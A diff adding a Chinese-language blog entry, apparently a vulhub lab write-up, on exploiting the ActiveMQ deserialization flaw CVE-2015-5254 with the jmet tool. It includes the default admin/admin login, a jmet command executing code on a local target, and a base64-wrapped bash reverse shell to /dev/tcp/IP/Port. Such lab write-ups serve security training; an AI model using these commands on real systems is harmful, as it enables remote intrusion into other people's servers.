@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>vulhub靶场</title>
+      <link href="/2024/06/13/vulhub%E9%9D%B6%E5%9C%BA/"/>
+      <url>/2024/06/13/vulhub%E9%9D%B6%E5%9C%BA/</url>
+      
+        <content type="html"><![CDATA[<h1 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h1><h2 id="ActiveMQ反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ反序列化漏洞（CVE-2015-5254）</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache ActiveMQ 5.13.0之前5.x版本中</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>启动环境</p><p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20240613135536.png"></p><p>访问admin目录，使用默认账密登录admin&#x2F;admin</p><p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20240613140647.png"></p><p>使用jmet利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME 127.0.0.1 61616</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20240613150225.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20240613150240.png"></p><p>此时点击查看这条消息即可触发命令执行，尝试反弹shell<code>bash -i &gt;&amp; /dev/tcp/IP/Port 0&gt;&amp;1</code>，进行编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -Y &quot;bash -c</span><br><span class="line">&#123;echo,编码结果&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 127.0.0.1 61616</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20240613152359.png"></p><p>开启端口监听，点击查看事件，成功反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20240613152515.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Vulnstack靶场1</title>
       <link href="/2024/06/12/Vulnstack%E9%9D%B6%E5%9C%BA1/"/>
       <url>/2024/06/12/Vulnstack%E9%9D%B6%E5%9C%BA1/</url>
